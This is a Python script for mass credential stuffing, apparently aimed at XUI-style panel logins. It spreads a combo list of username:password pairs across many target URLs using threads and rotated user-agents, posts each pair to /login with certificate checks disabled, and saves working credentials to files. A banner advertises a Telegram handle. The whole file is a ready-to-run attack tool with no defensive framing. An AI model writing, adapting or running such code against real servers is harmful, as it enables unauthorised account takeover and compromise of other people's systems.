import requests
import threading
import concurrent.futures
from pystyle import Colors, Colorate, Center
from colorama import Fore, init
from os import system, name
import random
import json

init()

G = Fore.GREEN
R = Fore.RED
W = Fore.WHITE
RE = Fore.RESET

class C:
    def __init__(self, u, c, w, t):
        self.u = u
        self.c = c
        self.l = threading.Lock()
        self.urls = []
        self.cmb = []
        self.gd = []
        self.w = w
        self.t = t
        self.ua = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/89.0.4389.82 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/14.0.3 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/88.0.4324.150 Safari/537.36"
        ]
        self.checked = 0
        self.total = 0

    def l_u(self):
        try:
            with open(self.u, "r") as f:
                for line in f:
                    clean = line.strip().rstrip("/")
                    if not clean:
                        continue
                    if not clean.startswith("http://") and not clean.startswith("https://"):
                        clean = "http://" + clean
                    self.urls.append(clean)
        except FileNotFoundError:
            print(f"{R}URL file not found!{RE}")
            exit(1)

    def l_c(self):
        try:
            with open(self.c, "r", encoding="utf-8", errors="ignore") as f:
                self.cmb = [i.strip().split(":") for i in f if ":" in i]
        except FileNotFoundError:
            print(f"{R}Combo file not found!{RE}")
            exit(1)

    def run(self):
        self.l_u()
        self.l_c()
        self.total = len(self.urls) * len(self.cmb)
        print(f"{W}Testing {len(self.urls)} URLs with {len(self.cmb)} combos using {self.w} threads and timeout {self.t}s{RE}\n")
        try:
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.w) as e:
                e.map(self.chk, self.urls)
        except KeyboardInterrupt:
            print(f"\n{R}Exiting...{RE}")
            return

        self.clr()
        self.bnr()

        if self.gd:
            print("Good Logins Found:\n")
            with open("all-good.txt", "w") as f:
                for i in self.gd:
                    print(i)
                    f.write(i + "\n")
        else:
            print("No Good Logins Found.")

    def chk(self, u):
        lg = f"{u}/login"
        for us, pw in self.cmb:
            hd = {
                "User-Agent": random.choice(self.ua),
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "X-Requested-With": "XMLHttpRequest",
                "Content-Type": "application/json",
                "Connection": "keep-alive",
                "Cookie": "lang=en-US"
            }
            dt = {"username": us, "password": pw, "twoFactorCode": ""}
            try:
                r = requests.post(lg, headers=hd, json=dt, timeout=self.t, verify=False)
                j = json.loads(r.text)
                with self.l:
                    self.checked += 1
                    done = self.checked
                progress = f"[{done}/{self.total}]"
                if j.get("success") is True and j.get("msg") == "Login Successfully":
                    print(f"{progress} {G}[Good]{RE}     {u} -> {us}:{pw}")
                    with self.l:
                        with open("valid-logins.txt", "a") as f:
                            f.write(f"{u} -> {us}:{pw}\n")
                        self.gd.append(f"{u} -> {us}:{pw}")
                    return
                else:
                    print(f"{progress} {R}[Not Good]{RE} {u} -> {us}:{pw}")
            except:
                with self.l:
                    self.checked += 1
                continue

    def clr(self):
        system("cls" if name == "nt" else "clear")

    def bnr(self):
        b = '''
▗▖  ▗▖▗▖ ▗▖▗▄▄▄▖     ▗▄▄▖▗▄▄▖  ▗▄▖  ▗▄▄▖▗▖ ▗▖▗▄▄▄▖▗▄▄▖ 
 ▝▚▞▘ ▐▌ ▐▌  █      ▐▌   ▐▌ ▐▌▐▌ ▐▌▐▌   ▐▌▗▞▘▐▌   ▐▌ ▐▌
  ▐▌  ▐▌ ▐▌  █      ▐▌   ▐▛▀▚▖▐▛▀▜▌▐▌   ▐▛▚▖ ▐▛▀▀▘▐▛▀▚▖
▗▞▘▝▚▖▝▚▄▞▘▗▄█▄▖    ▝▚▄▄▖▐▌ ▐▌▐▌ ▐▌▝▚▄▄▖▐▌ ▐▌▐▙▄▄▖▐▌ ▐▌

                 t.me/secabuser
'''
        print(Colorate.Diagonal(Colors.red_to_blue, Center.XCenter(b)))


if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    system("cls" if name == "nt" else "clear")
    c = C("", "", 30, 8)
    c.bnr()
    uf = input(f"{W}URL file > {RE}").strip()
    cf = input(f"{W}Combo file > {RE}").strip()
    try:
        workers = int(input(f"{W}Max workers (threads) > {RE}").strip())
        timeout = float(input(f"{W}Timeout (seconds) > {RE}").strip())
    except:
        print(f"{R}Invalid input for threads or timeout.{RE}")
        exit(1)

    c.clr()
    c.bnr()
    c.u = uf
    c.c = cf
    c.w = workers
    c.t = timeout
    c.run()
